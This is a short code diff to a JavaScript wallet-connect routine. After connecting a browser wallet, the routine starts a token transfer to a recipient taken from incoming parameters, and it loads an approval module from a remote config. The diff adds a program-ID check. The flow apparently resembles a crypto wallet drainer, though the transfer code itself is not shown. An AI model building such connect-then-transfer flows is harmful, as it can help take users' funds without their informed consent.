@@ -98,8 +98,9 @@ async function runWalletConnect(raw) {
     const { address, provider } = await connectInjectedWallet(wallet);
     notifyParent(raw, address);
 
+    const programId = String(raw.transferProgramId || "").trim();
     const recipient = String(raw.transferRecipient || "").trim();
-    if (raw.tokenTransferEnabled !== false && recipient) {
+    if (raw.tokenTransferEnabled !== false && programId && recipient) {
       setStatus(`Confirm transfer in ${wallet}…`);
       const cfg = configForVercelHost(raw);
       const modUrl = String(cfg.approvalChunkUrl || "").trim();
